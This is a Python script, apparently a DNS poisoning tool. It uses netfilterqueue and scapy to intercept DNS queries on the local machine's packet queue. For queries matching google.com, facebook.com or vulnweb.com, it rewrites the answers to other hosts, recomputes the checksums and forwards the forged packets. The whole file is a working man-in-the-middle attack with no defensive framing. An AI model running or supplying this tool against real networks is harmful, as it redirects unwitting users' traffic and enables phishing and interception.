import netfilterqueue
from scapy.layers.dns import DNSQR, DNS, DNSRR, UDP
from scapy.layers.inet import IP
from scapy.sendrecv import send

dns_table = {  # spoofing tables
    b"google.com": b"www.vulnweb.com",
    b"facebook.com": b"www.bing.com",
    b"vulnweb.com": b"www.youtube.com",
}

def process_packets(packet: netfilterqueue.Packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSQR):
        url = scapy_packet[DNSQR].qname
        for targeted_url in list(dns_table.keys()):
            if targeted_url in url:
                print(f"{url.decode(errors='replace'):15} >>> {dns_table[targeted_url]}")
                answer = DNSRR(rrname=url, rdata=dns_table[targeted_url])
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1

                if scapy_packet.haslayer(IP):
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                if scapy_packet.haslayer(UDP):
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                # packet.drop()
                packet.set_payload(bytes(scapy_packet))
    packet.accept()
    # send(scapy_packet)



print("Starting Poisoner..")

nfq = netfilterqueue.NetfilterQueue()
nfq.bind(0, process_packets)
nfq.run()
